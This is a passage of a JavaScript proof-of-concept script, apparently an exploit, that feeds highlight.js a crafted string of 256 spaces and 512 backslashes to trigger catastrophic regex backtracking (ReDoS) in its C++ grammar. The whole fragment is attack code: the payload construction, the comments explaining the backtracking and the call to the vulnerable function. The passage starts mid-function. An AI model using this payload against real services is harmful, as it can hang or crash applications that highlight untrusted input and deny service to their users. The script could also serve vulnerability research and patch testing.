  const module = await import('highlight.js');
  const hljs = module.default;

  // Payload construction designed to trigger catastrophic backtracking in C-like grammars.
  // Highlight.js uses regex definitions for parsing strings, comments, and identifiers. 
  // Ambiguity between whitespace sequences and escape character rules can cause the regex engine
  // to explore exponentially many paths (O(2^n)).

  // This payload forces the lexer to repeatedly match and backtrack on ambiguous patterns 
  // within the C++/C grammar definitions, aiming to exceed the configured backtracking limit.
  const payload = ' '.repeat(256) + '\\'.repeat(512);

  console.log('[PoC] Executing highlight.js against crafted payload...');

  // Invoking highlight directly on the 'cpp' language definition.
  // If the environment has a backtracking limit set (e.g., via Node flags), 
  // this call may throw an exception or hang indefinitely upon reaching the limit.
  const result = hljs.highlight(payload, { language: 'cpp' });

  console.log('[PoC] Execution successfully returned.', result);
  return result;
}

await exploit();
